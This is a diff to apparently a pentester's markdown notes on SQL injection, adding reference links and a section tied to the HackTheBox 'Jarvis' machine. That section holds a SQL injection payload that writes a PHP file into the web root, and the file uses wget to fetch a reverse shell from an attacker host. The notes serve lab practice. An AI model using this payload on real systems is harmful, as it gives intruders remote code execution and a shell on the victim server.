@@ -3,13 +3,16 @@
 ## References
 
 
-Payloads
+#### Payloads\
 https://medium.com/@ismailtasdelen/sql-injection-payload-list-b97656cfd66b
 
-Pentestmonkey covers different version of databases
+#### Pentestmonkey covers different version of databases\
 http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
 
-
+#### Upload PHP file via SQL injection (Reference HTB-Jarvis machine)
+```
+9999 union select 1,(select '<?php exec(\"wget -O /var/www/html/shell.php http://10.10.14.14/php-reverse-shell.php\");?>'),3,4,5,6,7 INTO OUTFILE '/var/www/html/download.php'
+```
 
 ##  Mysql login page bypass using sql injection 
 
